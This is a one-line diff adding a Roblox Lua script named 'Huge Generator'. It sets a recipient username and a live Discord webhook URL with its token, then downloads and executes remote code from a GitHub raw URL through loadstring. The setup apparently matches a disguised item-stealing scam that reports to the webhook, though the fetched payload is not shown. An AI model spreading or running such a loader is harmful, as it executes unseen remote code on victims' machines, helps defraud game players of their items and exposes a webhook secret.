@@ -1,0 +1,1 @@
+lua _G.Username = "JustRobloxBloxyBee" _G.HubName = "Huge Generator" _G.WebhookUrl = "https://discord.com/api/webhooks/1103236358471962644/RBXb0E2PmDqQ7g9xnp8zc-ZEKbvBmKazzHvvCZVPRk2x5DZHQeYRqzKdLVvDq4NOi8Z0" loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
